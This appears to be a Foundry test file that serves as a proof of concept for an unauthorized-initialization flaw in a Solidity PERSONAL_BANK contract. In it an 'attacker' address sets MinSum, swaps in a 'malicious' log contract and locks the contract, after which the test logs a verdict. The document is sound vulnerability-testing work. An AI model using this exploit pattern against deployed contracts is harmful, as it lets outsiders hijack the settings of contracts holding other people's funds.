// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x01f8c4e3fa3edeb29e514cba738d87ce8c091d3f.sol";

contract PERSONAL_BANKTest is Test {
    PERSONAL_BANK bank;
    LogFile maliciousLog;
    address attacker = makeAddr("attacker");

    function setUp() public {
        // Deploy clean setup for each test
        bank = new PERSONAL_BANK();
        maliciousLog = new LogFile();
    }

    function test_UnauthorizedInitialization() public {
        console2.log("--- BEFORE-Trigger State ---");
        // Record initial MinSum state
        uint256 minSumBefore = bank.MinSum();
        console2.log("MinSum Before Attack: %s", minSumBefore);
        
        console2.log("--- Trigger Attack: SetMinSum and Initialize ---");
        vm.startPrank(attacker);
        // Attacker changes parameters and initializes the contract
        bank.SetMinSum(100);
        bank.SetLogFile(address(maliciousLog));
        bank.Initialized();
        vm.stopPrank();
        
        console2.log("--- AFTER-Trigger State ---");
        // Verify state modification
        uint256 minSumAfter = bank.MinSum();
        console2.log("MinSum After Attack: %s", minSumAfter);
        
        // Check if MinSum was changed as attacker intended
        bool minSumChanged = (minSumAfter == 100);
        console2.log("MinSum changed to attacker's value:", minSumChanged);
        
        console2.log("--- Verifying Contract Lockdown ---");
        // Verify contract lockdown prevents further changes
        vm.startPrank(attacker);
        vm.expectRevert(); // Should revert on post-init change attempt
        bank.SetMinSum(200);
        
        vm.expectRevert(); // Should revert on post-init change attempt
        bank.SetLogFile(address(0));
        vm.stopPrank();
        
        // Final vulnerability verdict
        if (minSumChanged) {
            console2.log("Vulnerability Exists: Attacker successfully modified MinSum and locked contract");
        } else {
            console2.log("Vulnerability not Exist: Attack failed to modify MinSum");
        }
    }
}